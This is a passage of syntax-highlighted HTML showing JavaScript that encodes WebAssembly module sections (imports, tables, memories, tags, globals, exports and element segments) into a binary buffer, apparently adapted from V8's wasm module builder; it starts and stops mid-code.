keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> result <span class="token keyword">of</span> type<span class="token punctuation">.</span>results<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    section<span class="token punctuation">.</span><span class="token function">emit_type</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token punctuation">&#125;</span>                <span class="token punctuation">&#125;</span>              <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>typeToBuffer<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>              console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>headerLen<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token keyword">return</span> binary<span class="token punctuation">.</span><span class="token function">trunc_buffer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span>headerLen<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span>          <span class="token comment">// Add imports section.</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>wasm<span class="token punctuation">.</span>imports<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>debug<span class="token punctuation">)</span> <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"emitting imports @ "</span> <span class="token operator">+</span> binary<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>            binary<span class="token punctuation">.</span><span class="token function">emit_section</span><span class="token punctuation">(</span>kImportSectionCode<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">section</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>              section<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>wasm<span class="token punctuation">.</span>imports<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> imp <span class="token keyword">of</span> wasm<span class="token punctuation">.</span>imports<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                section<span class="token punctuation">.</span><span class="token function">emit_string</span><span class="token punctuation">(</span>imp<span class="token punctuation">.</span>module<span class="token punctuation">)</span><span class="token punctuation">;</span>                section<span class="token punctuation">.</span><span class="token function">emit_string</span><span class="token punctuation">(</span>imp<span class="token punctuation">.</span>name <span class="token operator">||</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                section<span class="token punctuation">.</span><span class="token function">emit_u8</span><span class="token punctuation">(</span>imp<span class="token punctuation">.</span>kind<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>imp<span class="token punctuation">.</span>kind <span class="token operator">==</span> kExternalFunction<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                  section<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>imp<span class="token punctuation">.</span>type_index<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>imp<span class="token punctuation">.</span>kind <span class="token operator">==</span> kExternalGlobal<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                  section<span class="token punctuation">.</span><span class="token function">emit_type</span><span class="token punctuation">(</span>imp<span class="token punctuation">.</span>type<span class="token punctuation">)</span><span class="token punctuation">;</span>                  section<span class="token punctuation">.</span><span class="token function">emit_u8</span><span class="token punctuation">(</span>imp<span class="token punctuation">.</span>mutable<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>imp<span class="token punctuation">.</span>kind <span class="token operator">==</span> kExternalMemory<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                  <span class="token keyword">const</span> has_max <span class="token operator">=</span> imp<span class="token punctuation">.</span>maximum <span class="token operator">!==</span> <span class="token keyword">undefined</span><span class="token punctuation">;</span>                  <span class="token keyword">const</span> is_shared <span class="token operator">=</span> <span class="token operator">!</span><span class="token operator">!</span>imp<span class="token punctuation">.</span>shared<span class="token punctuation">;</span>                  <span class="token keyword">const</span> is_memory64 <span class="token operator">=</span> <span class="token operator">!</span><span class="token operator">!</span>imp<span class="token punctuation">.</span>is_memory64<span class="token punctuation">;</span>                  <span class="token keyword">let</span> limits_byte <span class="token operator">=</span>                    <span class="token punctuation">(</span>is_memory64 <span class="token operator">?</span> <span class="token number">4</span> <span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">|</span>                    <span class="token punctuation">(</span>is_shared <span class="token operator">?</span> <span class="token number">2</span> <span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">|</span>                    <span class="token punctuation">(</span>has_max <span class="token operator">?</span> <span class="token number">1</span> <span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  section<span class="token punctuation">.</span><span class="token function">emit_u8</span><span class="token punctuation">(</span>limits_byte<span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token keyword">let</span> <span class="token function-variable function">emit</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">val</span><span class="token punctuation">)</span> <span class="token operator">=></span>                    is_memory64                      <span class="token operator">?</span> section<span class="token punctuation">.</span><span class="token function">emit_u64v</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span>                      <span class="token operator">:</span> section<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token function">emit</span><span class="token punctuation">(</span>imp<span class="token punctuation">.</span>initial<span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token keyword">if</span> <span class="token punctuation">(</span>has_max<span class="token punctuation">)</span> <span class="token function">emit</span><span class="token punctuation">(</span>imp<span class="token punctuation">.</span>maximum<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>imp<span class="token punctuation">.</span>kind <span class="token operator">==</span> kExternalTable<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                  section<span class="token punctuation">.</span><span class="token function">emit_type</span><span class="token punctuation">(</span>imp<span class="token punctuation">.</span>type<span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token keyword">var</span> has_max <span class="token operator">=</span> <span class="token keyword">typeof</span> imp<span class="token punctuation">.</span>maximum <span class="token operator">!=</span> <span class="token string">"undefined"</span><span class="token punctuation">;</span>                  section<span class="token punctuation">.</span><span class="token function">emit_u8</span><span class="token punctuation">(</span>has_max <span class="token operator">?</span> <span class="token number">1</span> <span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// flags</span>                  section<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>imp<span class="token punctuation">.</span>initial<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// initial</span>                  <span class="token keyword">if</span> <span class="token punctuation">(</span>has_max<span class="token punctuation">)</span> section<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>imp<span class="token punctuation">.</span>maximum<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// maximum</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>imp<span class="token punctuation">.</span>kind <span class="token operator">==</span> kExternalTag<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                  section<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>kExceptionAttribute<span class="token punctuation">)</span><span class="token punctuation">;</span>                  section<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>imp<span class="token punctuation">.</span>type_index<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                  <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span>                    <span class="token string">"unknown/unsupported import kind "</span> <span class="token operator">+</span> imp<span class="token punctuation">.</span>kind                  <span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>              <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>          <span class="token comment">// Add functions declarations.</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>wasm<span class="token punctuation">.</span>functions<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>debug<span class="token punctuation">)</span> <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"emitting function decls @ "</span> <span class="token operator">+</span> binary<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>            binary<span class="token punctuation">.</span><span class="token function">emit_section</span><span class="token punctuation">(</span>kFunctionSectionCode<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">section</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>              section<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>wasm<span class="token punctuation">.</span>functions<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> func <span class="token keyword">of</span> wasm<span class="token punctuation">.</span>functions<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                section<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>func<span class="token punctuation">.</span>type_index<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>          <span class="token comment">// Add table section.</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>wasm<span class="token punctuation">.</span>tables<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>debug<span class="token punctuation">)</span> <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"emitting tables @ "</span> <span class="token operator">+</span> binary<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>            binary<span class="token punctuation">.</span><span class="token function">emit_section</span><span class="token punctuation">(</span>kTableSectionCode<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">section</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>              section<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>wasm<span class="token punctuation">.</span>tables<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> table <span class="token keyword">of</span> wasm<span class="token punctuation">.</span>tables<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>table<span class="token punctuation">.</span>has_init<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                  section<span class="token punctuation">.</span><span class="token function">emit_u8</span><span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// "has initializer"</span>                  section<span class="token punctuation">.</span><span class="token function">emit_u8</span><span class="token punctuation">(</span><span class="token number">0x00</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Reserved byte.</span>                <span class="token punctuation">&#125;</span>                section<span class="token punctuation">.</span><span class="token function">emit_type</span><span class="token punctuation">(</span>table<span class="token punctuation">.</span>type<span class="token punctuation">)</span><span class="token punctuation">;</span>                section<span class="token punctuation">.</span><span class="token function">emit_u8</span><span class="token punctuation">(</span>table<span class="token punctuation">.</span>has_max<span class="token punctuation">)</span><span class="token punctuation">;</span>                section<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>table<span class="token punctuation">.</span>initial_size<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>table<span class="token punctuation">.</span>has_max<span class="token punctuation">)</span> section<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>table<span class="token punctuation">.</span>max_size<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>table<span class="token punctuation">.</span>has_init<span class="token punctuation">)</span> section<span class="token punctuation">.</span><span class="token function">emit_init_expr</span><span class="token punctuation">(</span>table<span class="token punctuation">.</span>init_expr<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>          <span class="token comment">// Add memory section.</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>wasm<span class="token punctuation">.</span>memories<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>debug<span class="token punctuation">)</span> <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"emitting memories @ "</span> <span class="token operator">+</span> binary<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>            binary<span class="token punctuation">.</span><span class="token function">emit_section</span><span class="token punctuation">(</span>kMemorySectionCode<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">section</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>              section<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>wasm<span class="token punctuation">.</span>memories<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> memory <span class="token keyword">of</span> wasm<span class="token punctuation">.</span>memories<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">const</span> has_max <span class="token operator">=</span> memory<span class="token punctuation">.</span>max <span class="token operator">!==</span> <span class="token keyword">undefined</span><span class="token punctuation">;</span>                <span class="token keyword">const</span> is_shared <span class="token operator">=</span> <span class="token operator">!</span><span class="token operator">!</span>memory<span class="token punctuation">.</span>shared<span class="token punctuation">;</span>                <span class="token keyword">const</span> is_memory64 <span class="token operator">=</span> <span class="token operator">!</span><span class="token operator">!</span>memory<span class="token punctuation">.</span>is_memory64<span class="token punctuation">;</span>                <span class="token keyword">let</span> limits_byte <span class="token operator">=</span>                  <span class="token punctuation">(</span>is_memory64 <span class="token operator">?</span> <span class="token number">4</span> <span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">|</span>                  <span class="token punctuation">(</span>is_shared <span class="token operator">?</span> <span class="token number">2</span> <span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">|</span>                  <span class="token punctuation">(</span>has_max <span class="token operator">?</span> <span class="token number">1</span> <span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                section<span class="token punctuation">.</span><span class="token function">emit_u8</span><span class="token punctuation">(</span>limits_byte<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">let</span> <span class="token function-variable function">emit</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">val</span><span class="token punctuation">)</span> <span class="token operator">=></span>                  is_memory64 <span class="token operator">?</span> section<span class="token punctuation">.</span><span class="token function">emit_u64v</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span> <span class="token operator">:</span> section<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">emit</span><span class="token punctuation">(</span>memory<span class="token punctuation">.</span>min<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>has_max<span class="token punctuation">)</span> <span class="token function">emit</span><span class="token punctuation">(</span>memory<span class="token punctuation">.</span>max<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>          <span class="token comment">// Add tag section.</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>wasm<span class="token punctuation">.</span>tags<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>debug<span class="token punctuation">)</span> <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"emitting tags @ "</span> <span class="token operator">+</span> binary<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>            binary<span class="token punctuation">.</span><span class="token function">emit_section</span><span class="token punctuation">(</span>kTagSectionCode<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">section</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>              section<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>wasm<span class="token punctuation">.</span>tags<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> type_index <span class="token keyword">of</span> wasm<span class="token punctuation">.</span>tags<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                section<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>kExceptionAttribute<span class="token punctuation">)</span><span class="token punctuation">;</span>                section<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>type_index<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>          <span class="token comment">// Add stringref section.</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>wasm<span class="token punctuation">.</span>stringrefs<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>debug<span class="token punctuation">)</span> <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"emitting stringrefs @ "</span> <span class="token operator">+</span> binary<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>            binary<span class="token punctuation">.</span><span class="token function">emit_section</span><span class="token punctuation">(</span>kStringRefSectionCode<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">section</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>              section<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              section<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>wasm<span class="token punctuation">.</span>stringrefs<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> str <span class="token keyword">of</span> wasm<span class="token punctuation">.</span>stringrefs<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                section<span class="token punctuation">.</span><span class="token function">emit_string</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>          <span class="token comment">// Add global section.</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>wasm<span class="token punctuation">.</span>globals<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>debug<span class="token punctuation">)</span> <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"emitting globals @ "</span> <span class="token operator">+</span> binary<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>            binary<span class="token punctuation">.</span><span class="token function">emit_section</span><span class="token punctuation">(</span>kGlobalSectionCode<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">section</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>              section<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>wasm<span class="token punctuation">.</span>globals<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> global <span class="token keyword">of</span> wasm<span class="token punctuation">.</span>globals<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                section<span class="token punctuation">.</span><span class="token function">emit_type</span><span class="token punctuation">(</span>global<span class="token punctuation">.</span>type<span class="token punctuation">)</span><span class="token punctuation">;</span>                section<span class="token punctuation">.</span><span class="token function">emit_u8</span><span class="token punctuation">(</span>global<span class="token punctuation">.</span>mutable<span class="token punctuation">)</span><span class="token punctuation">;</span>                section<span class="token punctuation">.</span><span class="token function">emit_init_expr</span><span class="token punctuation">(</span>global<span class="token punctuation">.</span>init<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>          <span class="token comment">// Add export table.</span>          <span class="token keyword">var</span> exports_count <span class="token operator">=</span> wasm<span class="token punctuation">.</span>exports<span class="token punctuation">.</span>length<span class="token punctuation">;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>exports_count <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>debug<span class="token punctuation">)</span> <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"emitting exports @ "</span> <span class="token operator">+</span> binary<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>            binary<span class="token punctuation">.</span><span class="token function">emit_section</span><span class="token punctuation">(</span>kExportSectionCode<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">section</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>              section<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>exports_count<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> exp <span class="token keyword">of</span> wasm<span class="token punctuation">.</span>exports<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                section<span class="token punctuation">.</span><span class="token function">emit_string</span><span class="token punctuation">(</span>exp<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>                section<span class="token punctuation">.</span><span class="token function">emit_u8</span><span class="token punctuation">(</span>exp<span class="token punctuation">.</span>kind<span class="token punctuation">)</span><span class="token punctuation">;</span>                section<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>exp<span class="token punctuation">.</span>index<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>          <span class="token comment">// Add start function section.</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>wasm<span class="token punctuation">.</span>start_index <span class="token operator">!==</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>debug<span class="token punctuation">)</span> <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"emitting start function @ "</span> <span class="token operator">+</span> binary<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>            binary<span class="token punctuation">.</span><span class="token function">emit_section</span><span class="token punctuation">(</span>kStartSectionCode<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">section</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>              section<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>wasm<span class="token punctuation">.</span>start_index<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>          <span class="token comment">// Add element segments.</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>wasm<span class="token punctuation">.</span>element_segments<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>debug<span class="token punctuation">)</span> <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"emitting element segments @ "</span> <span class="token operator">+</span> binary<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>            binary<span class="token punctuation">.</span><span class="token function">emit_section</span><span class="token punctuation">(</span>kElementSectionCode<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">section</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>              <span class="token keyword">var</span> segments <span class="token operator">=</span> wasm<span class="token punctuation">.</span>element_segments<span class="token punctuation">;</span>              section<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>segments<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> segment <span class="token keyword">of</span> segments<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token comment">// Emit flag and header.</span>                <span class="token comment">// Each case below corresponds to a flag from</span>                <span class="token comment">// https://webassembly.github.io/spec/core/binary/modules.html#element-section</span>                <span class="token comment">// (not in increasing order).</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>segment<span class="token punctuation">.</span><span class="token function">is_active</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                  <span class="token keyword">if</span> <span class="token punctuation">(</span>segment<span class="token punctuation">.</span>table <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> segment<span class="token punctuation">.</span>type <span class="token operator">===</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>segment<span class="token punctuation">.</span><span class="token function">expressions_as_elements</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                      section<span class="token punctuation">.</span><span class="token function">emit_u8</span><span class="token punctuation">(</span><span class="token number">0x04</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                      section<span class="token punctuation">.</span><span class="token function">emit_init_expr</span><span class="token punctuation">(</span>segment<span class="token punctuation">.</span>offset<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                      section<span class="token punctuation">.</span><span class="token function">emit_u8</span><span class="token punctuation">(</span><span class="token number">0x00</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                      section<span class="token punctuation">.</span><span class="token function">emit_init_expr</span><span class="token punctuation">(</span>segment<span class="token punctuation">.</span>offset<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span>                  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>segment<span class="token punctuation">.</span><span class="token function">expressions_as_elements</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                      section<span class="token punctuation">.</span><span class="token function">emit_u8</span><span class="token punctuation">(</span><span class="token number">0x06</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                      section<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>segment<span class="token punctuation">.</span>table<span class="token punctuation">)</span><span class="token punctuation">;</span>                      section<span class="token punctuation">.</span><span class="token function">emit_init_expr</span><span class="token punctuation">(</span>segment<span class="token punctuation">.</span>offset<span class="token punctuation">)</span><span class="token punctuation">;</span>                      section<span class="token punctuation">.</span><span class="token function">emit_type</span><span class="token punctuation">(</span>segment<span class="token punctuation">.</span>type<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                      section<span class="token punctuation">.</span><span class="token function">emit_u8</span><span class="token punctuation">(</span><span class="token number">0x02</span><span class="token 